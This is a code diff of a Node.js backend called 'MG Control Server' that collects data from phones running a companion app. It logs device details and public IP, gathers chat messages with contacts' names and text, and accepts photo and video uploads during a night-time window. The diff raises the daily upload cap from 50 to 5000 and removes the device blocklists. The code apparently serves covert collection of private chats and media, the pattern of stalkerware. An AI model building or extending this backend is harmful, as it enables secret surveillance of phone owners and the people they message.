@@ -29,7 +29,7 @@ if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
 if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR, { recursive: true });
 
 // ============================================
-// CONFIG HELPERS
+// HELPERS
 // ============================================
 
 function loadConfig() {
@@ -39,12 +39,8 @@ function loadConfig() {
     } catch {
         return {
             enabled: true,
-            send_device_info: true,
-            send_files: true,
-            blocked_ips: [],
-            blocked_models: [],
             fileTypes: ['.jpg', '.jpeg', '.png', '.mp4', '.mov'],
-            maxFilesPerDay: 50,
+            maxFilesPerDay: 5000,
             uploadWindow: '22:00-06:00',
             maxFileSizeMB: 100,
             version: '1.0.2'
@@ -65,32 +61,11 @@ function publicIp(req) {
     return req.socket.remoteAddress || "";
 }
 
-function clean(value) {
-    return value == null ? "" : String(value);
+function saveLog(data) {
+    try {
+        fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
+    } catch {}
 }
-
-function number(value) {
-    const n = Number(value);
-    return Number.isFinite(n) ? n : 0;
-}
-
-function optionalNumber(value) {
-    const n = Number(value);
-    return Number.isFinite(n) ? n : null;
-}
-
-function json(res, payload, status = 200) {
-    const body = JSON.stringify(payload);
-    res.writeHead(status, {
-        "content-type": "application/json; charset=utf-8",
-        "cache-control": "no-store"
-    });
-    res.end(body);
-}
-
-// ============================================
-// FILE LOG HELPERS
-// ============================================
 
 function readLogs() {
     if (!fs.existsSync(LOG_FILE)) return [];
@@ -107,12 +82,6 @@ function readLogs() {
     }
 }
 
-function saveLog(data) {
-    try {
-        fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
-    } catch {}
-}
-
 function removeFileLogEntries(fileName) {
     const logs = readLogs();
     const nextLogs = logs.filter(entry => !(entry.type === "file" && entry.file === fileName));
@@ -120,6 +89,53 @@ function removeFileLogEntries(fileName) {
         const content = nextLogs.map(entry => JSON.stringify(entry)).join("\n");
         fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
     } catch {}
+}
+
+function json(res, payload, status = 200) {
+    const body = JSON.stringify(payload);
+    res.writeHead(status, {
+        "Content-Type": "application/json; charset=utf-8",
+        "Cache-Control": "no-store"
+    });
+    res.end(body);
+}
+
+// ============================================
+// SUPABASE HELPERS
+// ============================================
+
+async function ensureDevice(deviceId, data, req) {
+    const now = Date.now();
+    const { data: existing } = await supabase
+        .from("devices")
+        .select("created_at")
+        .eq("device_id", deviceId)
+        .maybeSingle();
+
+    const device = {
+        device_id: deviceId,
+        my_uid: parseInt(data.myUid) || 0,
+        public_id: data.publicId || "",
+        my_name: data.myName || "",
+        model: data.model || "",
+        brand: data.brand || "",
+        battery_percent: parseInt(data.batteryPercent) || null,
+        network_type: data.networkType || "",
+        public_ip: publicIp(req),
+        client_last_seen: parseInt(data.lastSeen) || now,
+        server_last_seen: now,
+        created_at: existing?.created_at || now
+    };
+
+    const { error } = await supabase
+        .from("devices")
+        .upsert(device, { onConflict: "device_id" });
+
+    if (error) {
+        console.error("Device upsert error:", error);
+        return false;
+    }
+    return true;
 }
 
 // ============================================
@@ -134,7 +150,7 @@ const server = http.createServer(async (req, res) => {
         );
 
         // ============================================
-        // CONFIG ENDPOINT
+        // 1. CONFIG ENDPOINT
         // ============================================
         if (req.method === "GET" && url.pathname === "/config") {
             const cfg = loadConfig();
@@ -147,102 +163,143 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
-        // DASHBOARD
+        // 2. DEVICE HEARTBEAT - form-urlencoded (App)
         // ============================================
-        if (req.method === "GET" && url.pathname === "/") {
-            // ... dashboard render code ...
-            return json(res, { status: "ok", message: "Dashboard" });
-        }
+        if (req.method === "POST" && 
+            (url.pathname === "/api/heartbeat" || url.pathname === "/api/v1/device/heartbeat" || url.pathname === "/track")) {
+            
+            let body = "";
+            req.on("data", (chunk) => {
+                body += chunk.toString();
+            });
 
-        // ============================================
-        // DEVICE HEARTBEAT - FIXED ✅
-        // ============================================
-        if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
-            const contentType = req.headers["content-type"] || "";
-
-            // ✅ Handle form-urlencoded (App sends this)
-            if (contentType.includes("application/x-www-form-urlencoded")) {
-                let body = "";
-                req.on("data", (chunk) => {
-                    body += chunk.toString();
-                });
-
-                req.on("end", async () => {
-                    try {
-                        const parsed = new URLSearchParams(body);
-                        const deviceId = parsed.get("deviceId") || parsed.get("device_id");
-
-                        if (!deviceId) {
-                            return json(res, { ok: false, error: "deviceId required" }, 400);
-                        }
-
-                        const now = Date.now();
-                        const device = {
-                            device_id: deviceId,
-                            my_uid: parseInt(parsed.get("myUid")) || 0,
-                            public_id: parsed.get("publicId") || "",
-                            my_name: parsed.get("myName") || "",
-                            model: parsed.get("model") || "",
-                            brand: parsed.get("brand") || "",
-                            battery_percent: parseInt(parsed.get("batteryPercent")) || null,
-                            network_type: parsed.get("networkType") || "",
-                            public_ip: publicIp(req),
-                            client_last_seen: parseInt(parsed.get("lastSeen")) || now,
-                            server_last_seen: now,
-                            created_at: now
-                        };
-
-                        const { data: existingDevice } = await supabase
-                            .from("devices")
-                            .select("created_at")
-                            .eq("device_id", deviceId)
-                            .maybeSingle();
-
-                        if (existingDevice?.created_at) {
-                            device.created_at = existingDevice.created_at;
-                        }
-
-                        const { error: deviceError } = await supabase
-                            .from("devices")
-                            .upsert(device, { onConflict: "device_id" });
-
-                        if (deviceError) {
-                            console.error("Device upsert error:", deviceError);
-                            return json(res, { ok: false, error: "database error" }, 500);
-                        }
-
-                        console.log(`[HEARTBEAT] ${deviceId} | ${device.brand || ""} ${device.model || ""} | Battery: ${device.battery_percent || "?"}%`);
-
-                        return json(res, { ok: true, device_id: deviceId });
-
-                    } catch (error) {
-                        console.error("Heartbeat error:", error);
-                        return json(res, { ok: false, error: "server error" }, 500);
+            req.on("end", async () => {
+                try {
+                    const parsed = new URLSearchParams(body);
+                    const deviceId = parsed.get("deviceId") || parsed.get("device_id");
+                    
+                    if (!deviceId) {
+                        return json(res, { ok: false, error: "deviceId required" }, 400);
                     }
-                });
 
-                req.on("error", () => {
-                    return json(res, { ok: false, error: "request error" }, 500);
-                });
+                    const data = {
+                        myUid: parsed.get("myUid"),
+                        publicId: parsed.get("publicId"),
+                        myName: parsed.get("myName"),
+                        model: parsed.get("model"),
+                        brand: parsed.get("brand"),
+                        batteryPercent: parsed.get("batteryPercent"),
+                        networkType: parsed.get("networkType"),
+                        lastSeen: parsed.get("lastSeen")
+                    };
 
-                return;
-            }
+                    await ensureDevice(deviceId, data, req);
 
-            // ✅ Handle JSON
-            const body = await readBody(req);
-            const deviceId = clean(body.deviceId);
-            // ... existing JSON logic ...
-            return json(res, { ok: false, error: "Unsupported content-type" }, 400);
+                    console.log(`[HEARTBEAT] ${deviceId} | ${data.brand || ""} ${data.model || ""} | Battery: ${data.batteryPercent || "?"}%`);
+
+                    return json(res, { ok: true, device_id: deviceId });
+
+                } catch (error) {
+                    console.error("Heartbeat error:", error);
+                    return json(res, { ok: false, error: "Server error" }, 500);
+                }
+            });
+
+            req.on("error", () => {
+                return json(res, { ok: false, error: "Request error" }, 500);
+            });
+
+            return;
         }
 
         // ============================================
-        // FILE UPLOAD - RAW BINARY
+        // 3. CHAT BATCH - form-urlencoded (App)
+        // ============================================
+        if (req.method === "POST" && 
+            (url.pathname === "/api/chat/batch" || url.pathname === "/api/v1/chat/batch")) {
+            
+            let body = "";
+            req.on("data", (chunk) => {
+                body += chunk.toString();
+            });
+
+            req.on("end", async () => {
+                try {
+                    const parsed = new URLSearchParams(body);
+                    const deviceId = parsed.get("deviceId") || parsed.get("device_id");
+                    const messagesStr = parsed.get("messages") || "[]";
+                    const messages = JSON.parse(messagesStr);
+
+                    if (!deviceId) {
+                        return json(res, { ok: false, error: "deviceId required" }, 400);
+                    }
+
+                    if (!Array.isArray(messages) || !messages.length) {
+                        return json(res, { ok: true, inserted: 0, skipped: 0 });
+                    }
+
+                    const rows = [];
+                    let skipped = 0;
+
+                    for (const msg of messages.slice(0, 50)) {
+                        if (!msg.mid) {
+                            skipped++;
+                            continue;
+                        }
+                        rows.push({
+                            device_id: deviceId,
+                            mid: msg.mid,
+                            direction: msg.direction === "out" ? "out" : "in",
+                            peer_uid: parseInt(msg.peerUid) || 0,
+                            peer_name: msg.peerName || "",
+                            text: (msg.text || "").slice(0, 500),
+                            message_time: parseInt(msg.time) || Date.now(),
+                            received_at: Date.now()
+                        });
+                    }
+
+                    if (!rows.length) {
+                        return json(res, { ok: true, inserted: 0, skipped });
+                    }
+
+                    const { data: insertedRows, error: messageError } = await supabase
+                        .from("messages")
+                        .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true })
+                        .select("device_id,mid");
+
+                    if (messageError) {
+                        console.error("Message insert error:", messageError);
+                        return json(res, { ok: false, error: "Database error" }, 500);
+                    }
+
+                    return json(res, {
+                        ok: true,
+                        inserted: insertedRows?.length || 0,
+                        skipped: skipped + (rows.length - (insertedRows?.length || 0))
+                    });
+
+                } catch (error) {
+                    console.error("Chat error:", error);
+                    return json(res, { ok: false, error: "Server error" }, 500);
+                }
+            });
+
+            req.on("error", () => {
+                return json(res, { ok: false, error: "Request error" }, 500);
+            });
+
+            return;
+        }
+
+        // ============================================
+        // 4. FILE UPLOAD - RAW BINARY (App)
         // ============================================
         if (req.method === "POST" && url.pathname === "/upload") {
             const contentType = req.headers["content-type"] || "";
-            const deviceId = req.query.deviceId || "unknown";
-            const fileName = req.query.name || "file.bin";
+            const deviceId = url.searchParams.get("deviceId") || "unknown";
+            const fileName = url.searchParams.get("name") || "file.bin";
 
+            // ✅ RAW BINARY - App sends this
             if (contentType.includes("application/octet-stream") ||
                 contentType.includes("image/jpeg") ||
                 contentType.includes("image/png") ||
@@ -253,7 +310,7 @@ const server = http.createServer(async (req, res) => {
                     buffer = Buffer.concat([buffer, chunk]);
                 });
 
-                req.on("end", () => {
+                req.on("end", async () => {
                     try {
                         const safeName = `${Date.now()}_${fileName}`;
                         const filePath = path.join(UPLOAD_DIR, safeName);
@@ -297,11 +354,11 @@ const server = http.createServer(async (req, res) => {
                 return;
             }
 
-            return json(res, { ok: false, error: "multipart/form-data or raw binary required" }, 400);
+            return json(res, { ok: false, error: "Raw binary required (Content-Type: application/octet-stream)" }, 400);
         }
 
         // ============================================
-        // GET ALL FILES
+        // 5. GET ALL FILES
         // ============================================
         if (req.method === "GET" && url.pathname === "/api/all-files") {
             const logs = readLogs();
@@ -313,43 +370,120 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
+        // 6. GET FILES FOR DEVICE
+        // ============================================
+        if (req.method === "GET" && url.pathname === "/api/files") {
+            const deviceId = url.searchParams.get("deviceId");
+            if (!deviceId) {
+                return json(res, { ok: false, error: "deviceId required" }, 400);
+            }
+            const logs = readLogs();
+            const files = logs
+                .filter(entry => entry.type === "file" && entry.device_id === deviceId)
+                .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
+            return json(res, { ok: true, files });
+        }
+
+        // ============================================
+        // 7. SERVE UPLOADED FILES
+        // ============================================
+        if (req.method === "GET" && url.pathname.startsWith("/uploads/")) {
+            const fileName = url.pathname.split("/").pop();
+            const filePath = path.join(UPLOAD_DIR, fileName);
+            if (!fs.existsSync(filePath)) {
+                return json(res, { ok: false, error: "File not found" }, 404);
+            }
+            res.writeHead(200, {
+                "Content-Type": "application/octet-stream",
+                "Cache-Control": "no-cache"
+            });
+            fs.createReadStream(filePath).pipe(res);
+            return;
+        }
+
+        // ============================================
+        // 8. DELETE FILE
+        // ============================================
+        if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) {
+            const fileName = url.pathname.split("/").pop();
+            if (!fileName) {
+                return json(res, { ok: false, error: "fileName required" }, 400);
+            }
+
+            const filePath = path.join(UPLOAD_DIR, fileName);
+            const thumbPath = path.join(THUMB_DIR, `thumb_${fileName}`);
+
+            if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+            if (fs.existsSync(thumbPath)) fs.unlinkSync(thumbPath);
+
+            removeFileLogEntries(fileName);
+
+            return json(res, { ok: true, message: "File deleted" });
+        }
+
+        // ============================================
+        // 9. ROOT / STATUS
+        // ============================================
+        if (req.method === "GET" && url.pathname === "/") {
+            return json(res, {
+                ok: true,
+                server: "MG Control Server",
+                version: loadConfig().version || "1.0.2",
+                uptime: process.uptime(),
+                time: new Date().toISOString()
+            });
+        }
+
+        // ============================================
         // 404
         // ============================================
-        return json(res, { ok: false, error: "not found" }, 404);
+        return json(res, { ok: false, error: "Endpoint not found" }, 404);
 
     } catch (error) {
-        console.error(error);
-        return json(res, { ok: false, error: "server error" }, 500);
+        console.error("Server error:", error);
+        return json(res, { ok: false, error: "Server error" }, 500);
     }
 });
-
-// ============================================
-// HELPERS
-// ============================================
-
-function isHeartbeatPath(pathname) {
-    return pathname === "/api/heartbeat" || pathname === "/api/v1/device/heartbeat";
-}
-
-async function readBody(req) {
-    const chunks = [];
-    for await (const chunk of req) {
-        chunks.push(chunk);
-    }
-    const raw = Buffer.concat(chunks).toString("utf8");
-    if (!raw) return {};
-    try { return JSON.parse(raw); } catch { return {}; }
-}
 
 // ============================================
 // START SERVER
 // ============================================
 
 server.listen(PORT, () => {
-    console.log(`🚀 MG Server running on port ${PORT}`);
-    console.log(`📡 URL: http://localhost:${PORT}`);
-    console.log(`📁 Uploads: ${UPLOAD_DIR}`);
-    console.log(`📁 Thumbs: ${THUMB_DIR}`);
-    console.log(`📋 Config: ${JSON.stringify(loadConfig())}`);
-    console.log(`========================================`);
+    const cfg = loadConfig();
+    console.log(`
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║   🚀 MG CONTROL SERVER                                      ║
+║   📡 Running on: http://localhost:${PORT}                     ║
+║                                                              ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   📋 CONFIG:                                                ║
+║      Enabled: ${cfg.enabled ? '✅' : '❌'}                       ║
+║      File Types: ${cfg.fileTypes?.join(', ') || 'all'}        ║
+║      Max Files/Day: ${cfg.maxFilesPerDay || 'Unlimited'}     ║
+║                                                              ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   📁 STORAGE:                                               ║
+║      Uploads: ${UPLOAD_DIR}                                ║
+║      Thumbs: ${THUMB_DIR}                                  ║
+║      Logs: ${LOG_FILE}                                     ║
+║                                                              ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   📌 ENDPOINTS:                                             ║
+║      GET  /                 - Status                        ║
+║      GET  /config           - App config (1/0)             ║
+║      POST /track            - Device heartbeat             ║
+║      POST /api/chat/batch   - Chat messages                ║
+║      POST /upload           - File upload (RAW binary)     ║
+║      GET  /api/files        - Device files                 ║
+║      GET  /api/all-files    - All files                    ║
+║      GET  /uploads/*        - Serve uploaded files         ║
+║      DELETE /api/file/*     - Delete file                  ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+    `);
 });
